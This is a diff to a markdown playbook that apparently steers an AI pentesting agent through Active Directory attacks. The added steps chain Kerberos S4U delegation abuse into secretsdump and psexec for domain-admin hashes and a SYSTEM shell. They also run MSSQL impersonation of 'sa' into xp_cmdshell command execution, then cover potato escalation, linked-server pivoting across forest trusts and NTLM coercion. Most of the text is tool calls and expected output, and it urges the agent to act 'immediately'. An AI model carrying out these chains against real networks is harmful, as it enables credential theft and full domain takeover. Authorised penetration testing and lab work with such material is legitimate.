@@ -73,46 +73,131 @@ Machine account abuse via ADCS - create computer with DC's dNSHostName:
 
 ## Delegation Attacks
 
-### Constrained Delegation
-When constrained delegation is found:
+### Constrained Delegation (S4U Attack Chain)
+When constrained delegation is found, this is a HIGH VALUE attack path:
+
+**STEP 1: Get Administrator ticket via S4U**
 ```
-constrained_delegation_s4u(
-    target_spn="cifs/target.domain.com",
+s4u_attack(
+    target_spn="cifs/dc01.domain.local",
     impersonate="Administrator",
-    domain="domain.com"
+    domain="domain.local",
+    username="svc_account",
+    password="service_password",  # pragma: allowlist secret
+    dc_ip="192.168.58.10"
 )
-→ Get ticket for target service as Administrator
 ```
+→ Look for: "Saving ticket in Administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache"
+
+**STEP 2: IMMEDIATELY use ticket with secretsdump_kerberos**
+```
+secretsdump_kerberos(
+    target="dc01.domain.local",
+    username="Administrator",
+    domain="domain.local",
+    ticket_path="Administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache",
+    dc_ip="192.168.58.10"
+)
+```
+→ If target is DC: krbtgt hash = DOMAIN ADMIN
+→ If target is DC: Administrator hash = DOMAIN ADMIN
+
+**STEP 3: Alternative - psexec_kerberos for SYSTEM shell**
+```
+psexec_kerberos(
+    target="dc01.domain.local",
+    username="Administrator",
+    domain="domain.local",
+    ticket_path="Administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache",
+    command="cmd /c whoami && hostname"
+)
+```
+→ SYSTEM shell on target
+
+**CRITICAL:** The ticket is useless by itself! You MUST use it immediately with secretsdump_kerberos or psexec_kerberos.
 
 Use alt_service parameter for SPN modification if needed.
 
 ### Unconstrained Delegation
 When unconstrained delegation is found:
 ```
-1. Request coercion from orchestrator
+1. Request coercion from orchestrator (PetitPotam, PrinterBug)
 2. Capture TGT from coerced authentication
-3. Use TGT for DCSync
+3. Use TGT for DCSync or lateral movement
 ```
 
 ## MSSQL Attacks (HIGH PRIORITY)
 
 MSSQL is often a path to domain compromise through impersonation and linked servers that cross domain/forest trusts.
 
-### Step 1: Enumerate Impersonation Rights (RUN THIS FIRST!)
-**CRITICAL**: Always check for impersonation rights before anything else - this is often the fastest path to sysadmin:
+**ATTACK CHAIN PRIORITY ORDER:**
+1. Enumerate impersonation → Impersonate 'sa' → Enable xp_cmdshell → Code execution
+2. Enumerate linked servers → Cross-domain/forest pivoting
+3. NTLM coercion → Relay attacks
+
+### Step 1: ENUMERATE IMPERSONATION RIGHTS (RUN THIS FIRST!)
+**CRITICAL**: Always check for impersonation rights BEFORE anything else - this is the FASTEST path to sysadmin:
 ```
 mssql_enum_impersonation(
     target="sql.domain.com",
-    username="sql_svc",
+    username="any_domain_user",
     password="found_password",  # pragma: allowlist secret
     domain="DOMAIN.COM"
 )
-→ Discover users you can impersonate (sa, dbo, etc.)
-→ If 'sa' is listed, you have a direct path to sysadmin!
 ```
+**Expected output showing impersonation rights:**
+```
+execute as   database   permission_name   state_desc   grantee             grantor
+----------   --------   ---------------   ----------   ----------------    -------
+b'LOGIN'     b''        IMPERSONATE       GRANT        DOMAIN\your_user    sa
+```
+→ If you see 'sa' as grantor with IMPERSONATE permission, **you can become sysadmin!**
 
-### Step 2: Enumerate Linked Servers
-When you have ANY valid SQL credential (from kerberoast, password spray, etc.):
+### Step 2: IMPERSONATE SA (if Step 1 shows you can)
+**IMMEDIATELY after finding impersonation rights:**
+```
+mssql_impersonate(
+    target="sql.domain.com",
+    username="any_domain_user",
+    password="password",  # pragma: allowlist secret
+    impersonate_user="sa",
+    query="SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')",
+    domain="DOMAIN.COM"
+)
+```
+→ Verify output shows: `sa` and `1` (confirming sysadmin)
+→ **You are now sysadmin!** Proceed to enable xp_cmdshell.
+
+### Step 3: Enable xp_cmdshell (as sysadmin)
+**After impersonating 'sa' or if you have sysadmin:**
+```
+mssql_enable_xp_cmdshell(
+    target="sql.domain.com",
+    username="any_domain_user",
+    password="password",  # pragma: allowlist secret
+    domain="DOMAIN.COM"
+)
+```
+→ Enable command execution capability
+
+### Step 4: Execute Commands
+**After enabling xp_cmdshell:**
+```
+mssql_command(
+    target="sql.domain.com",
+    username="any_domain_user",
+    password="password",  # pragma: allowlist secret
+    command="whoami /priv",
+    domain="DOMAIN.COM"
+)
+```
+→ Check for `SeImpersonatePrivilege` - enables potato attacks to SYSTEM
+→ Common result: Running as `NT AUTHORITY\NETWORK SERVICE` (limited privileges)
+
+**If NETWORK SERVICE:** You may need potato attacks (GodPotato, PrintSpoofer) to escalate to SYSTEM, OR look for other attack paths like constrained delegation on discovered accounts.
+
+### Step 5: Enumerate Linked Servers
+**Cross-domain/forest pivoting opportunity:**
 ```
 mssql_enum_linked_servers(
     target="sql.domain.com",
@@ -120,36 +205,10 @@ mssql_enum_linked_servers(
     password="found_password",  # pragma: allowlist secret
     domain="DOMAIN.COM"
 )
-→ Find linked servers that can be pivoted through
 ```
+→ Find linked servers for cross-domain pivoting
 
-### Step 3: Enable xp_cmdshell
-If you have sysadmin privileges:
-```
-mssql_enable_xp_cmdshell(
-    target="sql.domain.com",
-    username="sa",
-    password="password",  # pragma: allowlist secret
-    domain="DOMAIN.COM"
-)
-→ Enable command execution
-```
-
-### Step 4: Execute Commands
-After enabling xp_cmdshell:
-```
-mssql_command(
-    target="sql.domain.com",
-    username="sa",
-    password="password",  # pragma: allowlist secret
-    command="whoami /all",
-    domain="DOMAIN.COM"
-)
-→ Execute OS commands as SQL service account
-```
-
-### Step 5: Pivot Through Linked Servers
-When linked servers exist (cross-domain/forest pivoting!):
+**Pivot through linked server:**
 ```
 mssql_exec_linked(
     target="sql.domain.com",
@@ -159,42 +218,8 @@ mssql_exec_linked(
     password="password",  # pragma: allowlist secret
     domain="DOMAIN.COM"
 )
-→ Execute queries on remote server
-
-# Enable xp_cmdshell on linked server:
-mssql_exec_linked(
-    target="sql.domain.com",
-    linked_server="remote-sql",
-    query="EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
-    ...
-)
-
-# Execute commands on linked server:
-mssql_exec_linked(
-    target="sql.domain.com",
-    linked_server="remote-sql",
-    query="EXEC xp_cmdshell 'whoami /all'",
-    ...
-)
-→ Code execution across domain/forest trust!
 ```
-
-### MSSQL Impersonation (Use After Enumeration)
-After mssql_enum_impersonation shows you can impersonate a user:
-```
-# First: Run mssql_enum_impersonation to find targets (Step 1 above)
-# Then: Impersonate the discovered user
-mssql_impersonate(
-    target="sql.domain.com",
-    username="low_priv_user",
-    password="password",  # pragma: allowlist secret
-    impersonate_user="sa",  # Use user found in enumeration
-    query="SELECT SYSTEM_USER",
-    domain="DOMAIN.COM"
-)
-→ Execute as sysadmin user
-→ If impersonating 'sa', you can enable xp_cmdshell and get code execution!
-```
+→ Execute queries on remote server in different domain/forest!
 
 ### MSSQL NTLM Coercion
 Force SQL server to authenticate to your listener:
@@ -206,8 +231,8 @@ mssql_ntlm_coerce(
     listener_ip="YOUR_IP",
     domain="DOMAIN.COM"
 )
-→ Capture machine account hash for relay to LDAPS
 ```
+→ Capture machine account hash for relay to LDAPS
 
 ## Trust Attacks
 
